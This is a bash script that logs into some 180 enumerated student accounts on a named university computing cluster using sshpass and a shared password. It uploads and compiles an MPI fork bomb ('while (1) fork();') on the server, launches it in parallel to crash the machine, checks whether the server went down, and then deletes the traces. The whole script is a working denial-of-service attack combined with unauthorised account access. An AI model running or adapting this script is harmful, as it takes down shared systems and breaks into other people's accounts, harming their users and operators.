h#!/bin/bash
# Ktulhu Zohavaet Vseh!

Server=openmp.mipt.ru
Bombfile=./lulz.c
Bombbin=./lulz
Password=mpirun-np

echo "#include <mpi.h>"              >  $Bombfile
echo "#include <unistd.h>"           >> $Bombfile
echo "int main(int ac, char** av) {" >> $Bombfile
echo "MPI_Init(&ac, &av);"           >> $Bombfile
echo "while (1) fork();"             >> $Bombfile
echo "MPI_Finalize(); return 0;}"    >> $Bombfile
echo ""                              >> $Bombfile

###############
# Testing
###############

mpicc $Bombfile -o $Bombbin -Wall || exit 1
ping $Server -c 3 || exit 1

###############
# Bombing
###############

echo "Bombing lulz"

for gr in {1..9}
do
    for un in {1..20}
    do
        User=`printf "s91%d%02d" $gr $un`
        echo "Bombing $User"
        sshpass -p $Password scp -P 22805 $Bombfile $User@$Server:$Bombfile || continue
        sshpass -p $Password ssh -p 22805 $User@$Server "mpicc $Bombfile -O3 -o $Bombbin"
        sshpass -p $Password ssh -p 22805 $User@$Server "rm $Bombfile -f"
    done
done

rm -rf $Bombfile
rm -rf $Bombbin

###############
# Activating
###############

echo "Activating lulz"

for gr in {1..9}
do
    for un in {1..20}
    do
        User=`printf "s91%d%02d" $gr $un`
        sshpass -p $Password ssh -p 22805 $User@$Server "mpiexec -n 16 $Bombbin &"
    done
done

###############
# Checking
###############

sleep 300

ping $Server -c 3 || echo "Server is down!" || exit 0

###############
# Clean up
###############

echo "Server is still running... clean up"

for gr in {1..9}
do
    for un in {1..20}
    do
        User=`printf "s91%d%02d" $gr $un`
        sshpass -p $Password ssh -p 22805 $User@$Server "rm $Bombbin -f"
    done
done

echo "Server is cleaned up"